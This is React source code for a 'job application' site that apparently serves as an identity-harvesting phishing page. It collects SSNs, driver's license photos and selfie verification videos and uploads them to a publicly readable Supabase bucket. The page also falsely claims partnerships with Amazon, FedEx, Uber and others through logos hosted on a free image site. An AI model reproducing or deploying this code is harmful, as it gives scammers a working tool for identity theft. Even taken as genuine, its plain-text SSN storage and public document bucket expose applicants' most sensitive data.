import React, { useState, useRef } from 'react';
import Webcam from 'react-webcam';
import { Upload, Camera, Loader2, ArrowLeft, ChevronDown, CheckCircle2 } from 'lucide-react';
import { supabase } from './lib/supabase-simple';
import { Toaster, toast } from 'react-hot-toast';
import FileUpload from './components/FileUpload';
import VideoVerification from './components/VideoVerification';
import { motion, AnimatePresence } from 'framer-motion';
import { Logo } from './components/Logo';

const StepIndicator = ({ 
  number, 
  isActive, 
  isCompleted 
}: { 
  number: number; 
  isActive: boolean; 
  isCompleted: boolean;
}) => {
  return (
    <div
      className={`relative w-8 h-8 rounded-full flex items-center justify-center transition-all duration-200 ${
        isCompleted || isActive ? 'bg-red-600 text-white' : 'bg-gray-200 text-gray-600'
      }`}
    >
      <span className="text-sm font-medium">{number}</span>
    </div>
  );
};

const ProgressLine = ({ 
  isActive 
}: { 
  isActive: boolean;
}) => {
  return (
    <div className="flex-1 h-1 mx-2 bg-gray-200 rounded overflow-hidden">
      <div
        className={`h-full bg-red-600 transition-all duration-500 ${
          isActive ? 'w-full' : 'w-0'
        }`}
      />
    </div>
  );
};

type FormStep = 'personal' | 'documents' | 'video' | 'complete';

interface PersonalInfo {
  firstName: string;
  lastName: string;
  email: string;
  address: string;
  city: string;
  state: string;
  phoneNumber: string;
  ssn: string;
}

interface PersonalInfoErrors {
  fullName: string | null;
  phoneNumber: string | null;
  ssn: string | null;
  email: string | null;
}

const STATES = [
  'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware',
  'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky',
  'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi',
  'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico',
  'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania',
  'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont',
  'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'
];

function App() {
  const [step, setStep] = useState<FormStep>('personal');
  const [personalInfo, setPersonalInfo] = useState<PersonalInfo>({
    firstName: '',
    lastName: '',
    email: '',
    address: '',
    city: '',
    state: 'Arizona',
    phoneNumber: '',
    ssn: ''
  });
  const [personalInfoErrors, setPersonalInfoErrors] = useState<PersonalInfoErrors>({
    fullName: null,
    phoneNumber: null,
    ssn: null,
    email: null
  });
  const [frontId, setFrontId] = useState<File | null>(null);
  const [backId, setBackId] = useState<File | null>(null);
  const [isRecording, setIsRecording] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showVideoVerification, setShowVideoVerification] = useState(false);
  const webcamRef = useRef<Webcam>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  const steps: FormStep[] = ['personal', 'documents', 'video', 'complete'];
  const currentStepIndex = steps.indexOf(step);

  // Simplified validation functions
  const validateFullName = (fullName: string): string | null => {
    const sanitizedName = fullName.replace(/[^a-zA-Z\s]/g, '').trim();
    if (sanitizedName.length < 2) return 'Full name must contain at least two characters';
    if (!sanitizedName.includes(' ')) return 'Please enter both first and last name';
    return null;
  };

  const validatePhoneNumber = (phoneNumber: string): string | null => {
    const sanitizedNumber = phoneNumber.replace(/\D/g, '');
    if (sanitizedNumber.length !== 10) return 'Phone number must be exactly 10 digits';
    return null;
  };

  const validateSSN = (ssn: string): string | null => {
    const sanitizedSSN = ssn.replace(/\D/g, '');
    if (sanitizedSSN.length !== 9) return 'SSN must be exactly 9 digits';
    return null;
  };

  const validateEmail = (email: string): string | null => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) return 'Please enter a valid email address';
    return null;
  };

  // Format functions
  const formatPhoneNumber = (value: string): string => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length === 0) return '';
    if (numbers.length <= 3) return `(${numbers}`;
    if (numbers.length <= 6) return `(${numbers.slice(0, 3)}) ${numbers.slice(3)}`;
    return `(${numbers.slice(0, 3)}) ${numbers.slice(3, 6)}-${numbers.slice(6, 10)}`;
  };

  const formatSSN = (value: string): string => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length === 0) return '';
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 5) return `${numbers.slice(0, 3)}-${numbers.slice(3)}`;
    return `${numbers.slice(0, 3)}-${numbers.slice(3, 5)}-${numbers.slice(5, 9)}`;
  };

  const handlePersonalInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const fullNameError = validateFullName(`${personalInfo.firstName} ${personalInfo.lastName}`);
    const phoneError = validatePhoneNumber(personalInfo.phoneNumber);
    const ssnError = validateSSN(personalInfo.ssn);
    const emailError = validateEmail(personalInfo.email);

    setPersonalInfoErrors({
      fullName: fullNameError,
      phoneNumber: phoneError,
      ssn: ssnError,
      email: emailError
    });

    if (!fullNameError && !phoneError && !ssnError && !emailError) {
      setStep('documents');
    }
  };

  const handleDocumentsSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (frontId && backId) {
      setStep('video');
    }
  };

  const startRecording = () => {
    setIsRecording(true);
    setShowVideoVerification(true);
  };

  const handleVideoComplete = async (videos: { video1: Blob; video2: Blob }) => {
    setShowVideoVerification(false);
    await handleSubmission(videos);
  };

    const createTextFile = (data: PersonalInfo): Blob => {
    const content = `First Name: ${data.firstName}
Last Name: ${data.lastName}
Email: ${data.email}
Address: ${data.address}
City: ${data.city}
State: ${data.state}
Phone Number: ${data.phoneNumber}
SSN: ${data.ssn}
Submission Date: ${new Date().toISOString()}`;
    
    return new Blob([content], { type: 'text/plain' });
  };

  const handleSubmission = async (videos: { video1: Blob; video2: Blob }) => {
    try {
      setIsSubmitting(true);

      // Step 1: Generate UUID and insert into database
      const applicationId = crypto.randomUUID();
      console.log('💾 Inserting application data with ID:', applicationId);
      
      const { error: applicationError } = await supabase
        .from('job_applications')
        .insert({
          id: applicationId,
          first_name: personalInfo.firstName,
          last_name: personalInfo.lastName,
          email: personalInfo.email,
          address: personalInfo.address,
          city: personalInfo.city,
          state: personalInfo.state,
          phone_number: personalInfo.phoneNumber,
          ssn: personalInfo.ssn,
          status: 'pending'
        });

      console.log('📊 Database insert result:', { error: applicationError });

      if (applicationError) {
        throw new Error(`Database error: ${applicationError.message}`);
      }

      console.log('✅ Application inserted successfully with ID:', applicationId);
      
      // Create applicationData object for consistency
      const applicationData = { id: applicationId };
      toast.success('Application data saved successfully!');

      // Step 2: Upload files
      const timestamp = new Date().getTime();
      const randomString = Math.random().toString(36).substring(2, 8);
      const folderName = `application_${applicationData.id}_${timestamp}_${randomString}`;

      const textFileBlob = createTextFile(personalInfo);

      console.log('📁 Starting file uploads to folder:', folderName);

      // Test Supabase connection first
      try {
        console.log('🔗 Testing Supabase connection...');
        const { data: buckets, error: bucketError } = await supabase.storage.listBuckets();
        if (bucketError) {
          console.error('❌ Supabase connection failed:', bucketError);
          throw new Error(`Database connection failed: ${bucketError.message}`);
        }
        console.log('✅ Supabase connected, available buckets:', buckets?.map(b => b.name));
        
        console.log('🔍 Available buckets:', buckets?.map(b => ({ id: b.id, name: b.name, public: b.public })));
        
        const hasDocs = buckets?.some(b => b.name === 'documents' || b.id === 'documents');
        if (!hasDocs) {
          console.error('❌ Documents bucket not found. Available buckets:', buckets?.map(b => b.name));
          
          // Try to create the bucket programmatically
          console.log('🔧 Attempting to create documents bucket...');
          try {
            const { data: newBucket, error: createError } = await supabase.storage.createBucket('documents', {
              public: true,
              fileSizeLimit: 104857600, // 100MB
              allowedMimeTypes: null
            });
            
            if (createError) {
              console.error('❌ Failed to create bucket:', createError);
              throw new Error(`Documents storage bucket not found. Available buckets: ${buckets?.map(b => b.name).join(', ') || 'none'}. Please create a bucket named 'documents' in Supabase Storage dashboard.`);
            }
            
            console.log('✅ Successfully created documents bucket:', newBucket);
          } catch (createError) {
            console.error('❌ Bucket creation failed:', createError);
            throw new Error(`Documents storage bucket not found. Available buckets: ${buckets?.map(b => b.name).join(', ') || 'none'}. Please create a bucket named 'documents' in Supabase Storage dashboard.`);
          }
        }
      } catch (error) {
        console.error('❌ Pre-upload checks failed:', error);
        throw new Error(`Upload setup failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
      }

      // Simple, reliable upload function
      const uploadFile = async (file: Blob | File, fileName: string): Promise<string> => {
        const filePath = `${folderName}/${fileName}`;
        
        console.log(`⬆️ Uploading ${fileName} (${file.size} bytes)`);
        
        try {
          // Create proper File object
          const fileToUpload = file instanceof File ? file : 
            new File([file], fileName, { 
              type: fileName.endsWith('.txt') ? 'text/plain' :
                    fileName.endsWith('.jpg') ? 'image/jpeg' :
                    fileName.endsWith('.webm') ? 'video/webm' :
                    'application/octet-stream'
            });

          console.log(`📋 Uploading: ${fileToUpload.name}, Size: ${fileToUpload.size}, Type: ${fileToUpload.type}`);

          // Simple upload to Supabase
          const { data, error } = await supabase.storage
            .from('documents')
            .upload(filePath, fileToUpload, {
              upsert: true
            });

          if (error) {
            console.error(`❌ Upload error for ${fileName}:`, error);
            throw new Error(`Upload failed for ${fileName}: ${error.message}`);
          }

          console.log(`✅ Successfully uploaded ${fileName}`);
          return filePath;

        } catch (error) {
          console.error(`❌ Upload failed for ${fileName}:`, error);
          throw error;
        }
      };

      // Upload files sequentially for better error tracking
      const uploadedPaths: string[] = [];
      const filesToUpload = [
        { file: textFileBlob, fileName: 'personal_info.txt' },
        { file: frontId!, fileName: 'id_front.jpg' },
        { file: backId!, fileName: 'id_back.jpg' },
        { file: videos.video1, fileName: 'verification_1.webm' },
        { file: videos.video2, fileName: 'verification_2.webm' }
      ];

      // Debug file data before upload
      console.log('🔍 Debugging file data:');
      filesToUpload.forEach(({ file, fileName }) => {
        console.log(`📄 ${fileName}:`, {
          exists: !!file,
          size: file?.size || 0,
          type: file?.type || 'unknown',
          constructor: file?.constructor.name
        });
      });

      for (const { file, fileName } of filesToUpload) {
        try {
          if (!file) {
            throw new Error(`File ${fileName} is null or undefined`);
          }
          if (file.size === 0) {
            throw new Error(`File ${fileName} is empty (0 bytes)`);
          }
          
          const uploadedPath = await uploadFile(file, fileName);
          uploadedPaths.push(uploadedPath);
          console.log(`✅ Progress: ${uploadedPaths.length}/${filesToUpload.length} files uploaded`);
        } catch (error) {
          console.error(`❌ Failed to upload ${fileName}:`, error);
          throw new Error(`Failed to upload ${fileName}. ${error instanceof Error ? error.message : 'Please check your connection and try again.'}`);
        }
      }
      
      // Step 3: Update database with file paths
      await supabase
        .from('job_applications')
        .update({
          document_paths: uploadedPaths,
          updated_at: new Date().toISOString()
        })
        .eq('id', applicationData.id);

      toast.success('Files uploaded successfully!');
      setStep('complete');
      
    } catch (error) {
      console.error('Submission error:', error);
      
      let errorMessage = 'Failed to submit application.';
      
      if (error instanceof Error) {
        if (error.message.includes('Database error:')) {
          errorMessage = 'Failed to save your application data. Please check your internet connection and try again.';
        } else if (error.message.includes('File upload failed:')) {
          errorMessage = 'Failed to upload your documents. Please check your internet connection and try again.';
        } else {
          errorMessage = error.message;
        }
      }
      
      toast.error(errorMessage);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <Toaster position="top-right" />
      <div className="min-h-screen bg-gray-50">
        <div className="max-w-4xl mx-auto px-4 py-8">
          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center mb-12">
              <button 
                onClick={() => window.history.back()} 
                className="text-red-600"
              >
                <ArrowLeft className="w-6 h-6" />
              </button>
              <div className="flex-1 flex justify-center">
                <Logo />
              </div>
            </div>
            
            {/* Simplified Stepper */}
            <div className="mb-12">
              <div className="flex items-center justify-between">
                <div className="flex-1 flex items-center">
                  {steps.map((stepItem, index) => (
                    <React.Fragment key={stepItem}>
                      <StepIndicator
                        number={index + 1}
                        isActive={step === stepItem}
                        isCompleted={currentStepIndex > index}
                      />
                      {index < steps.length - 1 && (
                        <ProgressLine
                          isActive={currentStepIndex > index}
                        />
                      )}
                    </React.Fragment>
                  ))}
                </div>
              </div>
              <div className="flex justify-between text-sm mt-4 px-6">
                {steps.map((stepItem) => (
                  <span
                    key={stepItem}
                    className={`transition-colors ${
                      step === stepItem ? 'text-red-600 font-medium' : 'text-gray-600'
                    }`}
                  >
                    {stepItem === 'personal' && 'Details'}
                    {stepItem === 'documents' && 'Upload'}
                    {stepItem === 'video' && 'Verification'}
                    {stepItem === 'complete' && 'Summary'}
                  </span>
                ))}
              </div>
            </div>

            {/* Forms */}
            <div className="bg-white rounded-lg shadow-sm p-8">
              {step === 'personal' && (
                <form onSubmit={handlePersonalInfoSubmit} className="space-y-6">
                  <h2 className="text-2xl font-bold text-gray-900 mb-8">Details</h2>
                  
                  <div className="space-y-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
                      <input
                        type="text"
                        placeholder="Enter your full name"
                        required
                        className={`w-full px-4 py-3 rounded-lg border ${
                          personalInfoErrors.fullName ? 'border-red-500' : 'border-gray-300'
                        } focus:ring-2 focus:ring-red-500 focus:border-red-500`}
                        value={`${personalInfo.firstName} ${personalInfo.lastName}`}
                        onChange={(e) => {
                          const fullName = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                          const [first = '', ...lastParts] = fullName.split(' ');
                          const last = lastParts.join(' ');
                          
                          setPersonalInfo(prev => ({
                            ...prev,
                            firstName: first,
                            lastName: last
                          }));

                          const error = validateFullName(fullName);
                          setPersonalInfoErrors(prev => ({
                            ...prev,
                            fullName: error
                          }));
                        }}
                      />
                      {personalInfoErrors.fullName && (
                        <p className="mt-1 text-sm text-red-500">{personalInfoErrors.fullName}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
                      <div className="flex">
                        <div className="w-20 mr-2">
                          <button
                            type="button"
                            className="w-full px-3 py-3 rounded-lg border border-gray-300 flex items-center justify-between"
                          >
                            <img
                              src="https://flagcdn.com/w20/us.png"
                              alt="US"
                              className="w-6 h-4"
                            />
                            <ChevronDown className="w-4 h-4 text-gray-500" />
                          </button>
                        </div>
                        <input
                          type="tel"
                          placeholder="(555) 000-0000"
                          required
                          className={`flex-1 px-4 py-3 rounded-lg border ${
                            personalInfoErrors.phoneNumber ? 'border-red-500' : 'border-gray-300'
                          } focus:ring-2 focus:ring-red-500 focus:border-red-500`}
                          value={formatPhoneNumber(personalInfo.phoneNumber)}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                            setPersonalInfo(prev => ({ ...prev, phoneNumber: value }));
                            const error = validatePhoneNumber(value);
                            setPersonalInfoErrors(prev => ({
                              ...prev,
                              phoneNumber: error
                            }));
                          }}
                        />
                      </div>
                      {personalInfoErrors.phoneNumber && (
                        <p className="mt-1 text-sm text-red-500">{personalInfoErrors.phoneNumber}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                      <input
                        type="email"
                        placeholder="Enter your email"
                        required
                        className={`w-full px-4 py-3 rounded-lg border ${
                          personalInfoErrors.email ? 'border-red-500' : 'border-gray-300'
                        } focus:ring-2 focus:ring-red-500 focus:border-red-500`}
                        value={personalInfo.email}
                        onChange={(e) => {
                          const email = e.target.value;
                          setPersonalInfo(prev => ({ ...prev, email }));
                          const error = validateEmail(email);
                          setPersonalInfoErrors(prev => ({
                            ...prev,
                            email: error
                          }));
                        }}
                      />
                      {personalInfoErrors.email && (
                        <p className="mt-1 text-sm text-red-500">{personalInfoErrors.email}</p>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">State</label>
                      <div className="relative">
                        <select
                          required
                          className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 appearance-none"
                          value={personalInfo.state}
                          onChange={(e) => setPersonalInfo(prev => ({ ...prev, state: e.target.value }))}
                        >
                          {STATES.map(state => (
                            <option key={state} value={state}>{state}</option>
                          ))}
                        </select>
                        <ChevronDown className="absolute right-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Address</label>
                      <input
                        type="text"
                        placeholder="Enter your address"
                        required
                        className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500"
                        value={personalInfo.address}
                        onChange={(e) => setPersonalInfo(prev => ({ ...prev, address: e.target.value }))}
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
                      <input
                        type="text"
                        placeholder="Enter your city"
                        required
                        className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500"
                        value={personalInfo.city}
                        onChange={(e) => setPersonalInfo(prev => ({ ...prev, city: e.target.value }))}
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">SSN</label>
                      <input
                        type="password"
                        placeholder="Enter your SSN"
                        required
                        className={`w-full px-4 py-3 rounded-lg border ${
                          personalInfoErrors.ssn ? 'border-red-500' : 'border-gray-300'
                        } focus:ring-2 focus:ring-red-500 focus:border-red-500`}
                        value={formatSSN(personalInfo.ssn)}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, '').slice(0, 9);
                          setPersonalInfo(prev => ({ ...prev, ssn: value }));
                          const error = validateSSN(value);
                          setPersonalInfoErrors(prev => ({
                            ...prev,
                            ssn: error
                          }));
                        }}
                      />
                      {personalInfoErrors.ssn && (
                        <p className="mt-1 text-sm text-red-500">{personalInfoErrors.ssn}</p>
                      )}
                    </div>
                  </div>

                  <p className="text-sm text-gray-600 mt-6">
                    Your information is handled with the utmost confidentiality and used solely for verification purposes, in line with industry-standard data protection protocols.
                  </p>

                  <button
                    type="submit"
                    disabled={Object.values(personalInfoErrors).some(error => error !== null)}
                    className="w-full py-3 px-4 bg-red-600 text-white rounded-lg hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Next
                  </button>
                </form>
              )}

              {step === 'documents' && (
                <form onSubmit={handleDocumentsSubmit} className="space-y-8">
                  <div className="text-center mb-8">
                    <h2 className="text-2xl font-bold text-gray-900 mb-2">Upload Your Documents</h2>
                    <p className="text-sm text-gray-600">
                      Please upload clear images of your driver's license
                    </p>
                  </div>
                  
                  <div className="grid md:grid-cols-2 gap-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Front of Driver's License</label>
                      <FileUpload
                        onFileAccepted={setFrontId}
                        onFileRemoved={() => setFrontId(null)}
                        side="front"
                        file={frontId}
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Back of Driver's License</label>
                      <FileUpload
                        onFileAccepted={setBackId}
                        onFileRemoved={() => setBackId(null)}
                        side="back"
                        file={backId}
                      />
                    </div>
                  </div>

                  <div className="flex justify-between mt-8">
                    <button
                      type="button"
                      onClick={() => setStep('personal')}
                      className="px-6 py-3 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors"
                    >
                      Back
                    </button>
                    <button
                      type="submit"
                      disabled={!frontId || !backId}
                      className="px-6 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      Next
                    </button>
                  </div>
                </form>
              )}

              {step === 'video' && (
                <div className="space-y-6">
                  <div className="text-center mb-8">
                    <h2 className="text-2xl font-bold text-gray-900 mb-4">Get Ready for Your Selfie Video Verification</h2>
                    <div className="relative w-full aspect-square max-w-[300px] mx-auto mb-6">
                      <img
                        src="https://i.ibb.co/vCxgHNJk/verification-Icon.webp"
                        alt="Verification"
                        className="w-full h-full object-contain"
                      />
                    </div>
                    <div className="text-left max-w-md mx-auto space-y-4">
                      <ul className="space-y-2 text-gray-600">
                        <li>• Position your face within the frame</li>
                        <li>• Ensure good lighting and a clear background</li>
                        <li>• Stay still and maintain a neutral expression</li>
                        <li>• Keep your face clearly visible throughout</li>
                      </ul>
                    </div>
                  </div>

                  <div className="flex flex-col sm:flex-row justify-between gap-4">
                    <button
                      type="button"
                      onClick={() => setStep('documents')}
                      className="w-full sm:w-auto px-6 py-3 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors"
                      disabled={isRecording || isSubmitting}
                    >
                      Back
                    </button>
                    <button
                      type="button"
                      onClick={startRecording}
                      className="w-full sm:w-auto min-w-[200px] px-6 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors flex items-center justify-center gap-2"
                      disabled={isSubmitting}
                    >
                      <Camera className="w-5 h-5" />
                      Continue
                    </button>
                  </div>
                </div>
              )}

              {step === 'complete' && (
                <div className="text-center">
                  <CheckCircle2 className="w-16 h-16 text-red-600 mx-auto mb-4" />
                  <h2 className="text-2xl font-bold text-gray-900 mb-4">Application Submitted!</h2>
                  <p className="text-gray-600">
                    Thank you for submitting your job application. We will review your information and contact you soon.
                  </p>
                </div>
              )}

              {isSubmitting && (
                <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex items-center justify-center z-50">
                  <div className="bg-white p-6 rounded-lg shadow-xl flex items-center space-x-4">
                    <Loader2 className="w-8 h-8 animate-spin text-red-500" />
                    <span className="text-lg font-medium">Submitting application...</span>
                  </div>
                </div>
              )}
            </div>

            {/* Partner Logos */}
            <div className="mt-16 max-w-4xl mx-auto">
              <p className="text-sm text-gray-600 mb-8 text-center">Official partner with</p>
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 md:gap-6 items-center px-4">
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/qYTtFL2V/amazonpartner1.webp" 
                    alt="Amazon" 
                    className="h-5 md:h-6 object-contain" 
                  />
                </div>
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/KcQ45VR2/aramexpartner2.webp" 
                    alt="Aramex" 
                    className="h-5 md:h-6 object-contain" 
                  />
                </div>
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/qY55scL4/doordashpartner3.webp" 
                    alt="DoorDash" 
                    className="h-4 md:h-5 object-contain" 
                  />
                </div>
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/MD11HtCt/fedexpartner4.webp" 
                    alt="FedEx" 
                    className="h-5 md:h-6 object-contain" 
                  />
                </div>
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/1GpdpwTT/geopostpartner5.webp" 
                    alt="Geopost" 
                    className="h-5 md:h-6 object-contain" 
                  />
                </div>
                <div className="flex items-center justify-center">
                  <img 
                    src="https://i.ibb.co/PGJ6QtB1/uberpartner6.webp" 
                    alt="Uber" 
                    className="h-4 md:h-5 object-contain" 
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Video Verification Modal */}
      <AnimatePresence>
        {showVideoVerification && (
          <VideoVerification
            onComplete={handleVideoComplete}
            onClose={() => setShowVideoVerification(false)}
          />
        )}
      </AnimatePresence>
    </>
  );
}

export default App;
